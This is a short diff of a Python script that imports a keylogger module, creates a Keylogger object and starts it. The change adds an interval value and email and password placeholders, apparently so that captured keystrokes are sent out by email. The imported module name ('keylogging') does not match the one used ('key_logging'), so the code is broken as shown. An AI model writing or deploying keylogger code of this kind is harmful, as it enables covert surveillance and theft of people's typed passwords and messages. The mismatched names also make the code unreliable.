@@ -1,4 +1,4 @@
 import keylogging
 
-my_keylogger=key_logging.Keylogger()   #creating an instance of the class.
+my_keylogger=key_logging.Keylogger(100, <email>, <password>)   #creating an instance of the class.
 my_keylogger.start()
